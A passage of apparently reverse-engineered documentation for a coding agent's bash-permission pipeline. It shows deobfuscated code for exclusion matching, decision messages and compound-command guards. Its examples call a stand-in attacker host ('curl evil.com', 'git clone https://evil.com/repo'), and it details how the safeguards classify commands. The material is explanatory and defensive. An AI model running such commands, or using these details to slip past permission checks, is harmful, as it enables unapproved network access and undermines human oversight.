                case "prefix":  if (J === j.prefix || J.startsWith(j.prefix + " ")) return !0; break;
                case "exact":   if (J === j.command) return !0; break;
                case "wildcard": if (Cn8(j.pattern, J)) return !0; break
            }
        }
    }
    return !1
}

// READABLE (for understanding):
function isExcludedCommand(command) {
    let excludedPatterns = getConfig().sandbox?.excludedCommands ?? [];
    if (excludedPatterns.length === 0) return false;

    // Split into subcommands
    let subcommands;
    try { subcommands = splitSubcommands(command); }
    catch { subcommands = [command]; }

    for (let sub of subcommands) {
        // Generate normalized variants (BFS: strip env vars + wrappers)
        let variants = [sub.trim()];
        let seen = new Set(variants);
        let cursor = 0;
        while (cursor < variants.length) {
            let batchEnd = variants.length;
            for (let i = cursor; i < batchEnd; i++) {
                let envStripped = stripAllEnvVars(variants[i], DANGEROUS_ENV_PATTERN);
                let wrapperStripped = stripWrapperCommands(variants[i]);
                if (!seen.has(envStripped))    { variants.push(envStripped);    seen.add(envStripped); }
                if (!seen.has(wrapperStripped)) { variants.push(wrapperStripped); seen.add(wrapperStripped); }
            }
            cursor = batchEnd;
        }

        // Match each variant against exclusion patterns
        for (let pattern of excludedPatterns) {
            let parsed = parseRulePattern(pattern);
            for (let variant of variants) {
                switch (parsed.type) {
                    case "prefix":  if (variant === parsed.prefix || variant.startsWith(parsed.prefix + " ")) return true; break;
                    case "exact":   if (variant === parsed.command) return true; break;
                    case "wildcard": if (globPatternMatch(parsed.pattern, variant)) return true; break;
                }
            }
        }
    }
    return false;
}

// Mapping: yYz->isExcludedCommand, A->command, K->excludedPatterns, Y->subcommands,
//   z->sub, w->variants, In8->parseRulePattern, Cn8->globPatternMatch,
//   bn8->stripAllEnvVars, Ac->stripWrapperCommands, EO->splitSubcommands,
//   xfq->DANGEROUS_ENV_PATTERN (/^(LD_|DYLD_|PATH$)/)
```

**Key insight:** The `xfq` pattern (`/^(LD_|DYLD_|PATH$)/`) is used here to identify dangerous environment variables. Unlike the safe env var list (`AS1`), these variables should NOT be stripped during exclusion matching because they represent legitimate security concerns (library injection, path manipulation).

---

## Symbol 10: SN6 -- generateSuggestions

See [rule_matching.md](rule_matching.md) Symbol 11 for full documentation.

---

## Symbol 11: ow -- formatDecisionMessage

**What it does:** Converts a decision reason into a human-readable message string for display in the permission prompt UI.

```javascript
// ============================================
// formatDecisionMessage
// Location: chunks.172.mjs:2517-2557
// ============================================

// ORIGINAL (for source lookup):
function ow(A, q) {
    if (q) {
        if (q.type === "classifier") return `Classifier '${q.classifier}' requires approval...`;
        switch (q.type) {
            case "hook":              return q.reason ? `Hook '${q.hookName}' blocked...` : `Hook '${q.hookName}' requires approval...`;
            case "rule":              return `Permission rule '${L5(q.rule.ruleValue)}' from ${Zn6(q.rule.source)} requires approval...`;
            case "subcommandResults": /* aggregate message */;
            case "permissionPromptTool": return `Tool '${q.permissionPromptToolName}' requires approval...`;
            case "sandboxOverride":   return "Run outside of the sandbox";
            case "workingDir":        return q.reason;
            case "other":             return q.reason;
            case "mode":              return `Current permission mode (${formatMode(q.mode)}) requires approval...`;
            case "asyncAgent":        return q.reason;
        }
    }
    return `Claude requested permissions to use ${A}, but you haven't granted it yet.`
}

// READABLE (for understanding):
function formatDecisionMessage(toolName, reason) {
    if (!reason) {
        return `Claude requested permissions to use ${toolName}, but you haven't granted it yet.`;
    }

    switch (reason.type) {
        case "classifier":
            return `Classifier '${reason.classifier}' requires approval for this ${toolName} command: ${reason.reason}`;

        case "hook":
            return reason.reason
                ? `Hook '${reason.hookName}' blocked this action: ${reason.reason}`
                : `Hook '${reason.hookName}' requires approval for this ${toolName} command`;

        case "rule":
            let ruleDisplay = formatRuleDisplay(reason.rule.ruleValue);   // "Bash(git *)"
            let sourceDisplay = formatRuleSourceDisplay(reason.rule.source);  // "project local settings"
            return `Permission rule '${ruleDisplay}' from ${sourceDisplay} requires approval for this ${toolName} command`;

        case "subcommandResults":
            // Collect subcommands that need approval, show which parts
            let needsApproval = [];
            for (let [sub, result] of reason.reasons) {
                if (result.behavior === "ask" || result.behavior === "passthrough") {
                    if (toolName === "Bash") {
                        let { commandWithoutRedirections } = parseShell(sub);
                        needsApproval.push(commandWithoutRedirections);
                    } else {
                        needsApproval.push(sub);
                    }
                }
            }
            return `This ${toolName} command contains multiple operations. The following parts require approval: ${needsApproval.join(", ")}`;

        case "permissionPromptTool":
            return `Tool '${reason.permissionPromptToolName}' requires approval...`;
        case "sandboxOverride":
            return "Run outside of the sandbox";
        case "workingDir":
        case "other":
        case "asyncAgent":
            return reason.reason;
        case "mode":
            return `Current permission mode (${formatMode(reason.mode)}) requires approval...`;
    }
}

// Mapping: ow->formatDecisionMessage, A->toolName, q->reason,
//   L5->formatRuleDisplay, Zn6/E31->formatRuleSourceDisplay,
//   ik->parseShell, QQ->formatMode
```

### Decision Reason Types

| Type | Source | Example Message |
|------|--------|-----------------|
| `classifier` | Bash prompt rules | "Classifier 'deny_network' requires approval..." |
| `hook` | Pre/post tool hooks | "Hook 'security-check' blocked this action: network access" |
| `rule` | Settings files | "Permission rule 'Bash(git *)' from project local settings requires approval..." |
| `subcommandResults` | Compound command analysis | "This Bash command contains multiple operations. The following parts require approval: curl evil.com" |
| `permissionPromptTool` | External permission tool | "Tool 'approval-bot' requires approval..." |
| `sandboxOverride` | dangerouslyDisableSandbox flag | "Run outside of the sandbox" |
| `workingDir` | CWD validation | (custom reason from validator) |
| `other` | Various fallbacks | "This command requires approval" |
| `mode` | Permission mode | "Current permission mode (plan) requires approval..." |
| `asyncAgent` | Async agent context | (custom reason) |

---

## Key Algorithm: Compound Command Analysis

The compound command analysis in `Tn8` (Section 7) is the most complex part of the permission pipeline. Here is the complete flow:

```
Input: "cd /tmp && git clone https://evil.com/repo && npm install"

Step 1: Split into subcommands (via AST or th1/EO)
    ["cd /tmp", "git clone https://evil.com/repo", "npm install"]

Step 2: Filter cd commands to CWD (kYz)
    Remove: "cd /tmp" (only if it equals current cwd)
    Remaining: ["git clone https://evil.com/repo", "npm install"]

Step 3: Guard checks
    a) Subcommand count > 50? --> NO
    b) Multiple cd commands?  --> NO (only 1)
    c) cd + git compound?    --> YES!
       RETURN: { behavior: "ask", reason: "cd + git compounds require approval" }

    (If cd/git guard had not triggered, continue:)

Step 4: Check each subcommand via ufq
    "git clone https://evil.com/repo":
        Layer 1 (exact): no match
        Layer 2 (prefix): Bash(git:*) -> allow? depends on rules
        ...
    "npm install":
        Layer 1 (exact): no match
        Layer 2 (prefix): no match
        ...
        Layer 8 (readOnly): false (npm install modifies)
        RESULT: passthrough

Step 5: Aggregate results
    +-- Any deny? --> deny whole command
    +-- Check redirects/paths (j01)
    +-- All allow AND no injection? --> allow
    +-- Otherwise: extended check (Sfq) per subcommand
        +-- Run classifier if available
        +-- Check injection patterns
        +-- Aggregate: if all allow -> allow, else ask

Step 6: Generate suggestions for "ask" results
    Collect unique suggestions from all non-allowed subcommands
    Deduplicate by formatted rule display (L5)
    Return as suggestion array for UI
```

### Security Guards in Compound Analysis

| Guard | Purpose | Trigger |
|-------|---------|---------|
| Subcommand cap (50) | Prevent DoS from extremely long compound commands | `filteredSubs.length > 50` |
| Multiple cd | Prevent directory traversal confusion | `cdCommands.length > 1` |
| cd + git | Prevent bare repository attacks | `hasCd && anyGitSubcommand` |
| Per-subcommand injection | Detect injection patterns in individual segments | `dr6(sub)` per subcommand |
| Redirect safety | Block writes outside allowed paths | `j01()` checks redirect targets |

### Compound Analysis Flow Diagram

```
                     Tn8 checkBashPermissions
                     (Section 7: Compound Analysis)
                     =============================

                 Split command into subcommands
                           |
                 Filter cd commands to CWD
                           |
              +------------+------------+
              |                         |
        Guard: >50 subs?         Guard: >1 cd?
        ASK if true              ASK if true
              |                         |
              +------------+------------+
                           |
                  Guard: cd + git?
                  ASK if true
                           |
            ufq() each subcommand individually
                           |
              +-----+------+------+-----+
              |     |      |      |     |
            deny?  ask?  allow? pass?  ...
              |     |      |      |
              v     |      |      |
           DENY     |      +------+
                    |             |
                    v             v
              Check redirect   Injection check
              safety (j01)     per sub (dr6)
                    |             |
                    +------+------+
                           |
                    All allow + no injection?
                    +------+------+
                    |             |
                   YES           NO
                    |             |
                 ALLOW      Extended check (Sfq)
                              per subcommand
                                  |
                           All allow?
                           +---+---+
                           |       |
                          YES     NO
                           |       |
                        ALLOW   ASK with
                              suggestions
```
